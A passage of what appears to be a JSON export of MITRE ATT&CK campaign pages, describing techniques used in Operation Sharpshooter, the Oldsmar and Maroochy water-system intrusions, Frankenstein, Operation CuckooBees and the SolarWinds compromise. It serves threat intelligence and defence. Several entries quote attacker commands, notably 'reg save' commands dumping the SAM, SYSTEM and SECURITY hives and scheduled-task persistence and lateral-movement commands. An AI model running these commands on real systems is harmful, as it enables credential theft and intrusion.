Name or Location During Operation Sharpshooter, threat actors installed Rising Sun in the Startup folder and disguised it as mssync.exe.[1] Enterprise T1106 Native API During Operation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().[1] Enterprise T1055 Process Injection During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[3] Enterprise T1090 Proxy For Operation Sharpshooter, the threat actors used the ExpressVPN service to hide their location.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Sharpshooter, the threat actors staged malicious files on Dropbox and other websites.[1] Enterprise T1204 .002 User Execution: Malicious File During Operation Sharpshooter, the threat actors relied on victims executing malicious Microsoft Word or PDF files.[1] Software ID Name Description S0448 Rising Sun During the investigation of Operation Sharpshooter, security researchers identified Rising Sun in 87 organizations across the globe and subsequently discovered three variants.[1][2] References Sherstobitoff, R., Malhotra, A., et. al.. (2018, December 18). Operation Sharpshooter Campaign Targets Global Defense, Critical Infrastructure. Retrieved May 14, 2020. I. Ilascu. (2019, March 3). Op 'Sharpshooter' Connected to North Korea's Lazarus Group. Retrieved September 26, 2022. L. O'Donnell. (2019, March 3). RSAC 2019: New Operation Sharpshooter Data Reveals Higher Complexity, Scope. Retrieved September 26, 2022. "
},
{
"id": 1744,
"title": "Oldsmar Treatment Plant Intrusion, Campaign C0009",
"path": "/campaigns/C0009/index.html",
"content": " Oldsmar Treatment Plant Intrusion Oldsmar Treatment Plant Intrusion was a cyber incident involving a water treatment facility in Florida. During this incident, unidentified threat actors leveraged features of the system to access and modify setpoints for a specific chemical required in the treatment process. The incident was detected immediately and prevented before it could cause any harm to the public.[1][2][3] ID: C0009 First Seen: February 2021 [1] Last Seen: February 2021 [1] Version: 1.0 Created: 20 September 2022 Last Modified: 21 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use ICS T0823 Graphical User Interface During the Oldsmar Treatment Plant Intrusion, the threat actors utilized the operator HMI interface through the graphical user interface. This action led to immediate operator detection as they were able to see the adversary making changes on their screen.[1] ICS T0831 Manipulation of Control During the Oldsmar Treatment Plant Intrusion, the threat actors utilized an operator HMI to manipulate process control setpoint values far beyond normal operating levels.[1] ICS T0836 Modify Parameter During the Oldsmar Treatment Plant Intrusion, the threat actors raised the sodium hydroxide setpoint value from 100 part-per-million (ppm) to 11,100 ppm, far beyond normal operating levels.[1] ICS T0886 Remote Services During the Oldsmar Treatment Plant Intrusion, the threat actors gained access to the system through remote access software, allowing for the use of the standard operator HMI interface.[1] References Pinellas County Sheriffs Office 2021, February 8 Treatment Plant Intrusion Press Conference Retrieved. 2021/10/08 CISA. (2021, February 11). Compromise of U.S. Water Treatment Facility . Retrieved October 18, 2022. Serino, G., et al . (2021, February 8). Recommendations Following the Oldsmar Water Treatment Facility Cyber Attack. Retrieved October 21, 2022. "
},
{
"id": 1745,
"title": "Maroochy Water Breach, Campaign C0020",
"path": "/campaigns/C0020/index.html",
"content": " Maroochy Water Breach Maroochy Water Breach was an incident in 2000 where an adversary leveraged the local government’s wastewater control system and stolen engineering equipment to disrupt and eventually release 800,000 liters of raw sewage into the local community.[1] ID: C0020 First Seen: February 2000 [1] Last Seen: April 2000 [1] Version: 1.0 Created: 10 March 2023 Last Modified: 05 April 2023 Version Permalink Live Version Techniques Used Domain ID Name Use ICS T0878 Alarm Suppression In the Maroochy Water Breach, the adversary suppressed alarm reporting to the central computer.[1] ICS T0879 Damage to Property In the Maroochy Water Breach, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. The raw sewage affected local parks, rivers, and even a local hotel. This resulted in harm to marine life and produced a sickening stench from the community's affected rivers.[1] ICS T0813 Denial of Control In the Maroochy Water Breach, the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.[1] ICS T0815 Denial of View In the Maroochy Water Breach, the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.[1] ICS T0822 External Remote Services In the Maroochy Water Breach, the adversary gained remote computer access to the system over radio.[1] ICS T0838 Modify Alarm Settings In the Maroochy Water Breach, the adversary disabled alarms at four pumping stations, preventing notifications to the central computer.[1] ICS T0836 Modify Parameter In the Maroochy Water Breach, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed for changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community.[1] ICS T0848 Rogue Master In the Maroochy Water Breach, the adversary falsified network addresses in order to send false data and instructions to pumping stations.[1] ICS T0856 Spoof Reporting Message In the Maroochy Water Breach, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.[1] ICS T0864 Transient Cyber Asset In the Maroochy Water Breach, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.[1] ICS T0855 Unauthorized Command Message In the Maroochy Water Breach, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.[1] ICS T0860 Wireless Compromise In the Maroochy Water Breach, the adversary used a two-way radio to communicate with and set the frequencies of Maroochy Shire's repeater stations.[1] References Marshall Abrams 2008, July 23 Malicious Control System Cyber Security Attack Case Study Maroochy Water Services, Australia Retrieved. 2018/03/27 "
},
{
"id": 1746,
"title": "Frankenstein, Campaign C0001",
"path": "/campaigns/C0001/index.html",
"content": " Frankenstein Frankenstein was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including Empire. The campaign name refers to the actors' ability to piece together several unrelated open-source tool components.[1] ID: C0001 First Seen: January 2019 [1] Last Seen: April 2019 [1] Version: 1.1 Created: 07 September 2022 Last Modified: 22 March 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Frankenstein, the threat actors used HTTP GET requests for C2.[1] Enterprise T1119 Automated Collection During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information.[1] Enterprise T1020 Automated Exfiltration During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.[1] .003 Command and Scripting Interpreter: Windows Command Shell During Frankenstein, the threat actors ran a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line [1] .005 Command and Scripting Interpreter: Visual Basic During Frankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.[1] Enterprise T1005 Data from Local System During Frankenstein, the threat actors used Empire to gather various local system information.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.[1] Enterprise T1041 Exfiltration Over C2 Channel During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2.[1] Enterprise T1203 Exploitation for Client Execution During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.[1] Enterprise T1105 Ingress Tool Transfer During Frankenstein, the threat actors downloaded files and tools onto a victim machine.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During Frankenstein, the threat actors named a malicious scheduled task \"WinUpdate\" for persistence.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During Frankenstein, the threat actors ran encoded commands from the command line.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Frankenstein, the threat actors obtained and used Empire.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Frankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.[1] Enterprise T1057 Process Discovery During Frankenstein, the threat actors used Empire to obtain a list of all running processes.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Frankenstein, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" [1] Enterprise T1518 .001 Software Discovery: Security Software Discovery During Frankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system.[1] Enterprise T1082 System Information Discovery During Frankenstein, the threat actors used Empire to obtain the compromised machine's name.[1] Enterprise T1016 System Network Configuration Discovery During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system.[1] Enterprise T1033 System Owner/User Discovery During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information.[1] Enterprise T1221 Template Injection During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.[1] Enterprise T1127 .001 Trusted Developer Utilities Proxy Execution: MSBuild During Frankenstein, the threat actors used MSbuild to execute an actor-created file.[1] Enterprise T1204 .002 User Execution: Malicious File During Frankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.[1] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.[1] Enterprise T1047 Windows Management Instrumentation During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.[1] Software ID Name Description S0363 Empire During Frankenstein the threat actors used Empire for discovery.[1] References Adamitis, D. et al. (2019, June 4). It's alive: Threat actors cobble together open-source pieces into monstrous Frankenstein campaign. Retrieved May 11, 2020. "
},
{
"id": 1747,
"title": "Operation CuckooBees, Campaign C0012",
"path": "/campaigns/C0012/index.html",
"content": " Operation CuckooBees Operation CuckooBees was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of Operation CuckooBees, which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed Operation CuckooBees was conducted by actors affiliated with Winnti Group, APT41, and BARIUM.[1] ID: C0012 First Seen: December 2019 [1] Last Seen: May 2022 [1] Contributors: Andrea Serrano Urea, Telefónica Tech Version: 1.1 Created: 22 September 2022 Last Modified: 22 March 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account During Operation CuckooBees, the threat actors used the net user command to gather account information.[1] .002 Account Discovery: Domain Account During Operation CuckooBees, the threat actors used the dsquery and dsget commands to get domain environment information and to query users in administrative groups.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation CuckooBees, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.[1] Enterprise T1547 .006 Boot or Logon Autostart Execution: Kernel Modules and Extensions During Operation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Operation CuckooBees, the threat actors used batch scripts to perform reconnaissance.[1] .005 Command and Scripting Interpreter: Visual Basic During Operation CuckooBees, the threat actors executed an encoded VBScript file using wscript and wrote the decoded output to a text file.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service During Operation CuckooBees, the threat actors modified the IKEEXT and PrintNotify Windows services for persistence.[1] Enterprise T1005 Data from Local System During Operation CuckooBees, the threat actors collected data, files, and other information from compromised networks.[1] Enterprise T1190 Exploit Public-Facing Application During Operation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers.[1] Enterprise T1133 External Remote Services During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[1] Enterprise T1083 File and Directory Discovery During Operation CuckooBees, the threat actors used dir c:\\\\ to search for files.[1] Enterprise T1574 .002 Hijack Execution Flow: DLL Side-Loading During Operation CuckooBees, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Name or Location During Operation CuckooBees, the threat actors renamed a malicious executable to rundll32.exe to allow it to blend in with other Windows system files.[1] Enterprise T1135 Network Share Discovery During Operation CuckooBees, the threat actors used the net share command as part of their advanced reconnaissance.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During Operation CuckooBees, the threat actors executed an encoded VBScript file.[1] .011 Obfuscated Files or Information: Fileless Storage During Operation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation CuckooBees, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During Operation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands: reg save HKLM\\\\SYSTEM system.hiv, reg save HKLM\\\\SAM sam.hiv, and reg save HKLM\\\\SECURITY security.hiv, to dump SAM, SYSTEM and SECURITY hives.[1] Enterprise T1201 Password Policy Discovery During Operation CuckooBees, the threat actors used the net accounts command as part of their advanced reconnaissance.[1] Enterprise T1120 Peripheral Device Discovery During Operation CuckooBees, the threat actors used the fsutil fsinfo drives command as part of their advanced reconnaissance.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During Operation CuckooBees, the threat actors used the net group command as part of their advanced reconnaissance.[1] Enterprise T1057 Process Discovery During Operation CuckooBees, the threat actors used the tasklist command as part of their advanced reconnaissance.[1] Enterprise T1018 Remote System Discovery During Operation CuckooBees, the threat actors used the net view and ping commands as part of their advanced reconnaissance.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.[1] Enterprise T1505 .003 Server Software Component: Web Shell During Operation CuckooBees, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.[1] Enterprise T1082 System Information Discovery During Operation CuckooBees, the threat actors used the systeminfo command to gather details about a compromised system.[1] Enterprise T1016 System Network Configuration Discovery During Operation CuckooBees, the threat actors used ipconfig, nbtstat, tracert, route print, and cat /etc/hosts commands.[1] Enterprise T1049 System Network Connections Discovery During Operation CuckooBees, the threat actors used the net session, net use, and netstat commands as part of their advanced reconnaissance.[1] Enterprise T1033 System Owner/User Discovery During Operation CuckooBees, the threat actors used the query user and whoami commands as part of their advanced reconnaissance.[1] Enterprise T1007 System Service Discovery During Operation CuckooBees, the threat actors used the net start command as part of their initial reconnaissance.[1] Enterprise T1124 System Time Discovery During Operation CuckooBees, the threat actors used the net time command as part of their advanced reconnaissance.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement.[1] Software ID Name Description S0105 dsquery [1] S0096 Systeminfo [1] References Cybereason Nocturnus. (2022, May 4). Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques. Retrieved September 22, 2022. "
},
{
"id": 1748,
"title": "SolarWinds Compromise, Campaign C0024",
"path": "/campaigns/C0024/index.html",
"content": " SolarWinds Compromise The SolarWinds Compromise was a sophisticated supply chain cyber operation conducted by APT29 that was discovered in mid-December 2020. APT29 used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. Industry reporting initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.[1][2][3][4][5][6][7][8] In April 2021, the US and UK governments attributed the SolarWinds Compromise to Russia's Foreign Intelligence Service (SVR); public statements included citations to APT29, Cozy Bear, and The Dukes.[9][10][11] The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds’ Orion product, a much smaller number were compromised by follow-on APT29 activity on their systems.[12] ID: C0024 First Seen: August 2019 [6] Last Seen: January 2021 [13] Version: 1.0 Created: 24 March 2023 Last Modified: 14 April 2023 Version Permalink Live Version Groups ID Name Description G0016 APT29 [9][10][11] Techniques Used Domain ID Name Use Enterprise T1087 Account Discovery During the SolarWinds Compromise, APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.[4] .002 Domain Account During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember.[5][14] Enterprise T1098 .001 Account Manipulation: Additional Cloud Credentials During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals.[15][5] .002 Account Manipulation: Additional Email Delegate Permissions During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.[4][15][16] .003 Account Manipulation: Additional Cloud Roles During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle.[5] .005 Account Manipulation: Device Registration During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command.[4] Enterprise T1583 .001 Acquire Infrastructure: Domains For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.[17][18] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration.[4] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives.[4][19][5] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.[4][7][5] .003 Command and Scripting Interpreter: Windows Command Shell During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines.[4][7] .005 Command and Scripting Interpreter: Visual Basic For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic.[20] Enterprise T1584 .001 Compromise Infrastructure: Domains For the SolarWinds Compromise, APT29 compromised domains to use for C2.[17] Enterprise T1555 Credentials from Password Stores During the SolarWinds Compromise, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.[19] .003 Credentials from Web Browsers During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome.[5] Enterprise T1213 Data from Information Repositories During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[5] .003 Code Repositories During the SolarWinds Compromise, APT29 downloaded source code from code repositories.[8] Enterprise T1005 Data from Local System During the SolarWinds Compromise, APT29 extracted files from compromised networks.[4] Enterprise T1074 .002 Data Staged: Remote Data Staging During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server.[4] Enterprise T1140 Deobfuscate/Decode Files or Information During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.[21] Enterprise T1587 .001 Develop Capabilities: Malware For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP.[3][22][19] Enterprise T1484 .002 Domain Policy Modification: Domain Trust Modification During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.[14][23] Enterprise T1482 Domain Trust Discovery During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[4] They also used AdFind to enumerate domains and to discover trust between federated domains.[5][19] Enterprise T1568 Dynamic Resolution During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[4] Enterprise T1114 .002 Email Collection: Remote Email Collection During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest.[4][20] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe.[19][23] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.[4] Enterprise T1190 Exploit Public-Facing Application During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[4][20] Enterprise T1133 External Remote Services For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[17][5] Enterprise T1083 File and Directory Discovery During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.[4] Enterprise T1606 .001 Forge Web Credentials: Web Cookies During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.[4] .002 Forge Web Credentials: SAML Tokens During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates.[15][14] Enterprise T1589 .001 Gather Victim Identity Information: Credentials For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments.[5] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.[19] .002 Impair Defenses: Disable Windows Event Logging During the SolarWinds Compromise, APT29, used AUDITPOL to prevent the collection of audit logs.[19] .004 Impair Defenses: Disable or Modify System Firewall During the SolarWinds Compromise, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets.[19] Enterprise T1070 Indicator Removal During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.[3] .004 File Deletion During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.[3] .006 Timestomp During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files.[19] .008 Clear Mailbox Data During the SolarWinds Compromise, APT29 removed evidence of email export requests using Remove-MailboxExportRequest.[4] Enterprise T1105 Ingress Tool Transfer During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.[3] Enterprise T1036 Masquerading During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[3] .004 Masquerade Task or Service During the SolarWinds Compromise, APT29 named tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate.[4] .005 Match Legitimate Name or Location During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign.[4][7] Enterprise T1003 .006 OS Credential Dumping: DCSync During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers.[23][19][5] Enterprise T1069 Permission Groups Discovery During the SolarWinds Compromise, APT29 used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.[4] .002 Domain Groups During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups.[5] Enterprise T1057 Process Discovery During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes.[4][19][5] Enterprise T1090 .001 Proxy: Internal Proxy During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB.[5][21] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers.[5] .002 Remote Services: SMB/Windows Admin Shares During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users.[5] .006 Remote Services: Windows Remote Management During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts.[21] Enterprise T1018 Remote System Discovery During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems.[19] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.[4][3][22] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.[19] Enterprise T1539 Steal Web Session Cookie During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[5] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.[3] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.[2][3][20][19] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During the SolarWinds Compromise, APT29 used Rundll32.exe to execute payloads.[15][19] Enterprise T1082 System Information Discovery During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk.[19] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.[17] Enterprise T1199 Trusted Relationship During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[20][5] Enterprise T1552 .004 Unsecured Credentials: Private Keys During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.[23][20] Enterprise T1550 Use Alternate Authentication Material During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.[23][14] .001 Application Access Token During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment.[5] .004 Web Session Cookie During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account.[4][5] Enterprise T1078 Valid Accounts During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[3][17][20] .002 Domain Accounts During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.[5] .003 Local Accounts During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks.[5] .004 Cloud Accounts During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal.[5] Enterprise T1047 Windows Management Instrumentation During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.[23][19] Software ID Name Description S0552 AdFind [7][5] S0154 Cobalt Strike [3][20] S0597 GoldFinder [17] S0588 GoldMax [17] S0002 Mimikatz [23][5] S0565 Raindrop [19][21] S0589 Sibot [17] S0559 SUNBURST [3][19][24][2][25][26] S0562 SUNSPOT [22] S0560 TEARDROP [19][26][3] S0682 TrailBlazer [5] References SolarWinds. (2020, December 24). SolarWinds Security Advisory. Retrieved February 22, 2021. Sudhakar Ramakrishna . (2021, January 11). New Findings From Our Investigation of SUNBURST. Retrieved January 13, 2021. FireEye. (2020, December 13). Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor. Retrieved January 4, 2021. Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020. CrowdStrike. (2022, January 27). Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign. Retrieved February 7, 2022. Unit 42. (2020, December 23). SolarStorm Supply Chain Attack Timeline. Retrieved March 24, 2023. MSTIC. (2020, December 18). Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers . Retrieved January 5, 2021. MSRC Team. (2021, February 18). Microsoft Internal Solorigate Investigation – Final Update. Retrieved May 14, 2021. NSA, FBI, DHS. (2021, April 15). Russian SVR Targets U.S. and Allied Networks. Retrieved April 16, 2021. UK NCSC. (2021, April 15). UK and US call out Russia for SolarWinds compromise. Retrieved April 16, 2021. Mandiant. (2020, April 27). Assembling the Russian Nesting Doll: UNC2452 Merged into APT29. Retrieved March 26, 2023. FBI, CISA, ODNI, NSA. (2022, January 5). Joint Statement by the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Office of the Director of National Intelligence (ODNI), and the National Security Agency (NSA). Retrieved March 26, 2023. Microsoft Threat Intelligence Center (MSTIC). (2021, May 27). New sophisticated email-based attack from NOBELIUM. Retrieved May 28, 2021. Secureworks CTU. (n.d.). IRON RITUAL. Retrieved February 24, 2022. MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020. Microsoft Threat Intelligence Center. (2021, October 25). NOBELIUM targeting delegated administrative privileges to facilitate broader attacks. Retrieved March 25, 2022. Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021. Smith, L., Leathery, J., Read, B. (2021, March 4). New SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based Entity; Possible Connection to UNC2452. Retrieved March 12, 2021. MSTIC, CDOC, 365 Defender Research Team. (2021, January 20). Deep dive into the Solorigate second-stage activation: From SUNBURST to 